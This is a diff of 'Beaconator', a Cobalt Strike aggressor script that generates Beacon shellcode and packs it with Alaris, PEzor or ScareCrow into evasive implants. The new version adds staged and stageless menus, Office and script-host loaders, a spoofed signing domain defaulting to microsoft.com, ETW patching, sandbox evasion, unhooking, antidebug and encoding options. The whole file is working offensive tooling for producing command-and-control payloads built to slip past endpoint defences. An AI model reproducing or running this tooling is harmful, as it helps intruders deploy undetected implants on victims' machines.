@@ -1,22 +1,91 @@
-# Beaconator: A beacon generator using Cobalt Strike and PEzor.
+# Beaconator: A beacon generator aggressor script.
 # Author: @captmeelo
-# Version: 1.1
+# Version: 2.0
 # Blog: https://captmeelo.com/
 # GitHub: https://github.com/capt-meelo
 
+### GLOBAL VARIABLES ###
 # Working directory
-$BUILD_DIR = "/output";
+$SCRIPTS_DIR = "/scripts";
+$BUILD_DIR_ALARIS = "/output/alaris";
+$BUILD_DIR_PEZOR = "/output/pezor";
+$BUILD_DIR_SCARECROW = "/output/scarecrow";
 
-menubar("Beaconator", "beaconator");
+# Location of Alaris (CHANGE THIS!)
+$ALARIS_DIR = "C:\\tools\\Alaris";
+# Location of ScareCrow (CHANGE THIS!)
+$SCARECROW_DIR = "/root/tools/ScareCrow";
+###########################################
 
+menubar("Generate Beacon", "beaconator");
 popup beaconator {
-    item "Generate Beacon" {
-        runBeaconator();
+    menu "Staged" {
+        item "Via Alaris (Windows Only)" {
+        runAlaris();
+       }
     }
+
+	menu "Stageless" {
+		item "Via PEzor (Linux Only)" {
+			runPEzor();
+		}
+        item "Via ScareCrow (Linux Only)" {
+			runScareCrow();
+		}
+	}
 }
 
-sub runBeaconator {
-    $dialog = dialog("Beacon Generator", %(listener => "Select Listener", arch => "x64"), &generateBeacon);
+### STAGED SHELLCODE SECTION ###
+sub runAlaris {
+    $dialog = dialog("Genearate Beacon via Alaris", %(listener => "Select Listener", arch => "x64"), &generateBeaconAlaris);
+    dialog_description($dialog, "Generate a raw staged shellcode using Cobalt Strike, then pack the generated shellcode with Alaris.");
+    drow_listener($dialog, "listener", "Listener:");
+    drow_combobox($dialog, "arch", "Architecture:", @("x86", "x64"));
+    drow_text($dialog, "password", "Password:");
+    dbutton_action($dialog, "Generate");
+    dbutton_help($dialog, "https://github.com/cribdragg3r/Alaris/blob/master/README.adoc");
+    dialog_show($dialog);
+}
+
+sub generateBeaconAlaris {
+	if ($3['listener'] ismatch "Select Listener") {
+		show_message("ERROR: No listener is selected.");
+		break;
+	}
+
+    if ($3['password'] eq "") {
+        show_message("ERROR: Password is required.");
+		break;
+    }
+
+    # Create the shellcode based on the listener & architecture
+    println("\c5[*] Generating shellcode...");
+    $shellcode = artifact_stager($3['listener'], "raw", $3['arch']);
+
+    # Write shellcode to a file
+    $handle = openf(">".script_resource($BUILD_DIR_ALARIS)."\\shellcode.bin");
+    writeb($handle, $shellcode);
+    closef($handle);
+    println("\c9[+] Successfully generated shellcode ".script_resource($BUILD_DIR_ALARIS)."\\shellcode.bin");
+
+    # Command to be executed
+    $command = ("python3 builder.py -s ".script_resource($BUILD_DIR_ALARIS)."\\shellcode.bin -p $3['password'] -o ".script_resource($BUILD_DIR_ALARIS));
+
+    # Execute command
+    print("\c5[*] Executing: $command");
+    $process = exec($command, $null, $ALARIS_DIR);
+    @data = readAll($process);
+    printAll(@data);
+    closef($process);
+
+    println("\c9[+] Success! Generated beacon can be found at ".script_resource($BUILD_DIR_ALARIS).".");
+    show_message("Success! Generated beacon can be found at ".script_resource($BUILD_DIR_ALARIS).".");
+}
+
+
+### STAGELESS SHELLCODE SECTION ###
+sub runPEzor {
+    $dialog = dialog("Genearate Beacon via PEzor", %(listener => "Select Listener", arch => "x64"), &generateBeaconPEzor);
     dialog_description($dialog, "Generate a raw stageless shellcode using Cobalt Strike, then pack the generated shellcode with PEzor.");
     drow_listener_stage($dialog, "listener", "Listener:");
     drow_combobox($dialog, "arch", "Architecture:", @("x86", "x64"));
@@ -36,7 +105,7 @@ sub runBeaconator {
     dialog_show($dialog);
 }
 
-sub generateBeacon {
+sub generateBeaconPEzor {
     # Reset the variables to fix the issue with options persisting to subsequent payload generations
     $arch = "";
     $arch_pezor = "";
@@ -51,152 +120,218 @@ sub generateBeacon {
     $sleep = "";
     $format = "";
 
-    ### Set the variables ###
-    # Set the architecture
+    # Set the variables
     $arch = $3['arch'];
 
-    # Set the architecture using PEzor's format
     if ($3['arch'] eq "x86") {
         $arch_pezor = "-32";
     } else {
         $arch_pezor = "-64";
     }
 
-    # Set the user-land hooking option
     if ($3['unhook'] eq "true") {
         $unhook = "-unhook";
     }
     
-    # Set the antidebug option
     if ($3['antidebug'] eq "true") {
         $antidebug = "-antidebug";
     }
 
-    # Set the syscalls option
     if ($3['syscalls'] eq "true") {
         $syscalls = "-syscalls";
     }
 
-    # Set the sgn option
     if ($3['sgn'] eq "true") {
         $sgn = "-sgn";
     }
 
-    # Set the text option
     if ($3['text'] eq "true") {
         $text = "-text";
     }
 
-    # Set the rx option
     if ($3['rx'] eq "true") {
         $rx = "-rx";
     }
 
-    # Set the self option
     if ($3['self'] eq "true") {
         $self = "-self";
     }
 
-    # Set the cleanup option
     if ($3['cleanup'] eq "true") {
         $cleanup = "-cleanup";
     }
 
-    # Set the sleep option
     if ($3['sleep'] eq "true") {
         $sleep = "-sleep=".$3['sleep_sec'];
     }
 
-    # Set the output format
     $format = $3['format'];
 
 
-    ### Error checks ###
-    # Show error prompt if no listener was selected
+    # Error checks
 	if ($3['listener'] ismatch "Select Listener") {
 		show_message("ERROR: No listener is selected.");
 		break;
 	}
 
-    # Error if syscalls are use with x86
     if (($arch_pezor eq "-32") && ($syscalls eq "-syscalls")) {
         show_message("ERROR: Cannot inline syscalls with 32bits applications.");
 		break;
     }
 
-    # Error if syscalls are user with dotnet
     if (('dotnet*' iswm $format) && ($syscalls eq "-syscalls")) {
         show_message("ERROR: Cannot inline syscalls when targeting .NET.");
 		break;
     }
 
-    # Error if BOF and user-land hooking are used
     if (($format eq "bof") && ($unhook eq "-unhook")) {
         show_message("ERROR: Cannot unhook when targeting BOFs.");
 		break;
     }
 
-    # Error if BOF and self-execution are used
     if (($format eq "bof") && ($self eq "-self")) {
         show_message("ERROR: Cannot self-execute when targeting BOFs.");
 		break;
     }
 
-    # Error if rx are encoded with sgn
     if (($rx eq "-rx") && ($sgn eq "-sgn")) {
         show_message("ERROR: Cannot encode the shellcode when self-executing the payload.");
 		break;
     }
 
-    # Error if clean up is used with non-BOF format
     if (($format ne "bof") && ($cleanup eq "-cleanup")) {
         show_message("ERROR: Cleanup can only be used for BOFs.");
 		break;
     }
 
-    # Error if sleep_sec has an input but sleep checkbox is not checked
     if (($3['sleep'] eq "false") && ($3['sleep_sec'] ne "")) {
         show_message("ERROR: Sleep option not checked.");
 		break;
     }
 
-    # Error if sleep checkbox is not checked and no input in sleep_sec
     if (($3['sleep'] eq "true") && ($3['sleep_sec'] eq "")) {
         show_message("ERROR: Number of seconds not set.");
 		break;
     }
 
 
-    ### Generate the shellcode and beacon ###
-    # Create the shellcode based on the listener, architecture, and use "process" as the exit method
+    # Create the shellcode based on the listener, architecture, & use "process" as the exit method
     println("\c5[*] Generating shellcode...");
     $shellcode = payload($3['listener'], $arch, "process");
 
     # Write shellcode to a file
-    $handle = openf(">" .script_resource($BUILD_DIR). "/shellcode.bin");
+    $handle = openf(">".script_resource($BUILD_DIR_PEZOR)."/shellcode.bin");
     writeb($handle, $shellcode);
     closef($handle);
-    println("\c9[+] Successfully generated shellcode " .script_resource($BUILD_DIR). "/shellcode.bin");
+    println("\c9[+] Successfully generated shellcode ".script_resource($BUILD_DIR_PEZOR)."/shellcode.bin");
 
-    # Generate the beacon (forcing shellcode detection w/ -shellcode option)
-    @command = @("PEzor.sh", "$arch_pezor", "$unhook", "$antidebug", "$syscalls", "$sgn", "$text", "$rx", "$self", "$cleanup", "$sleep", "-shellcode", "-format=$format", script_resource($BUILD_DIR)."/shellcode.bin");
+    # Command to be executed (forcing shellcode detection w/ -shellcode option)
+    @command = @("PEzor.sh", "$arch_pezor", "$unhook", "$antidebug", "$syscalls", "$sgn", "$text", "$rx", "$self", "$cleanup", "$sleep", "-shellcode", "-format=$format", script_resource($BUILD_DIR_PEZOR)."/shellcode.bin");
     
-    # Remove empty param values to prevent insertion of additional whitespaces which breaks the -sgn option
+    # Remove empty parameter to prevent insertion of additional whitespaces which breaks the -sgn option
     remove(@command, $null);
 
-    # Print the PEzor commands to be executed
+    # Execute command
     print("\c5[*] Executing:");
     foreach $param (@command) {
         print(" " . $param);
     }
-    
-    # Execute commands
-    $process = exec(@command, $null, script_resource($BUILD_DIR));
+
+    $process = exec(@command, $null, script_resource($BUILD_DIR_PEZOR));
     @data = readAll($process);
     printAll(@data);
     closef($process);
 
     # Show message
-    println("\c9[+] Success! Generated beacon can be found at " . script_resource($BUILD_DIR). ".");
-    show_message("Success! Generated beacon can be found at " . script_resource($BUILD_DIR). ".");
+    println("\c9[+] Success! Generated beacon can be found at ".script_resource($BUILD_DIR_PEZOR).".");
+    show_message("Success! Generated beacon can be found at ".script_resource($BUILD_DIR_PEZOR).".");
+}
+
+sub runScareCrow {
+    $dialog = dialog("Genearate Beacon via ScareCrow", %(listener => "Select Listener", loader => "binary", domain => "microsoft.com"), &generateBeaconScareCrow);
+    dialog_description($dialog, "Generate a raw stageless shellcode using Cobalt Strike, then pack the generated shellcode with ScareCrow.");
+    drow_listener_stage($dialog, "listener", "Listener:");
+    drow_combobox($dialog, "loader", "Loader:", @("binary", "control", "dll", "excel", "msiexec", "wscript"));
+    drow_text($dialog, "output", "Output File (.js or .hta):");
+    drow_text($dialog, "domain", "Domain Name:");
+    drow_checkbox($dialog, "etw", "ETW:", "Enables ETW patching");
+    drow_checkbox($dialog, "sandbox", "Sandbox:", "Enables sandbox evasion");
+    dbutton_action($dialog, "Generate");
+    dbutton_help($dialog, "https://github.com/optiv/ScareCrow/blob/main/README.md");
+    dialog_show($dialog);
+}
+
+sub generateBeaconScareCrow {
+    # Reset the variables to fix the issue with options persisting to subsequent payload generations
+    $loader = "";
+    $output = "";
+    $domain = "";
+    $etw = "";
+    $sandbox = "";
+
+    # Set the variables
+    $loader = "-Loader ".$3['loader'];
+
+    $output = "-O ".$3['output'];
+
+    $domain = "-domain ".$3['domain'];
+    
+    if ($3['etw'] eq "true") {
+        $etw = "-etw";
+    }
+
+    if ($3['sandbox'] eq "true") {
+        $sandbox = "-sandbox";
+    }
+
+
+    # Error checks
+	if ($3['listener'] ismatch "Select Listener") {
+		show_message("ERROR: No listener is selected.");
+		break;
+	}
+
+    if (($3['loader'] eq "excel") || ($3['loader'] eq "msiexec") || ($3['loader'] eq "wscript")) {
+		if ($3['output'] eq "") {
+            show_message("ERROR: Output file name not set.");
+		    break;
+        }
+	} else {
+        $output = "";
+    }
+
+    if ($3['domain'] eq "") {
+        show_message("ERROR: Domain name not set.");
+        break;
+    }
+
+    # Create the shellcode based on the listener, set the arch to "x64," & use "process" as the exit method
+    println("\c5[*] Generating shellcode...");
+    $shellcode = payload($3['listener'], "x64", "process");
+
+    # Write shellcode to a file
+    $handle = openf(">".script_resource($BUILD_DIR_SCARECROW)."/shellcode.bin");
+    writeb($handle, $shellcode);
+    closef($handle);
+    println("\c9[+] Successfully generated shellcode ".script_resource($BUILD_DIR_SCARECROW)."/shellcode.bin");
+
+    # Command to be executed
+    $scarecrow_command = ($SCARECROW_DIR."/ScareCrow -I ".script_resource($BUILD_DIR_SCARECROW)."/shellcode.bin $loader $domain $etw $sandbox $output");
+    @command = @("python3", script_resource($SCRIPTS_DIR)."/scarecrow_helper.py", $scarecrow_command);
+
+    # Execute command
+    println("\c5[*] Generating beacon using ScareCrow. This may take a while...");
+    print("\c5[*] Executing:");
+    foreach $param (@command) {
+        print(" " . $param);
+    }
+    
+    $process = exec(@command, $null, script_resource($BUILD_DIR_SCARECROW));
+    @data = readAll($process);
+    printAll(@data);
+    closef($process);
+
+    # Show message
+    println("\c9[+] Success! Generated beacon can be found at ".script_resource($BUILD_DIR_SCARECROW).".");
+    show_message("Success! Generated beacon can be found at ".script_resource($BUILD_DIR_SCARECROW).".");
 }
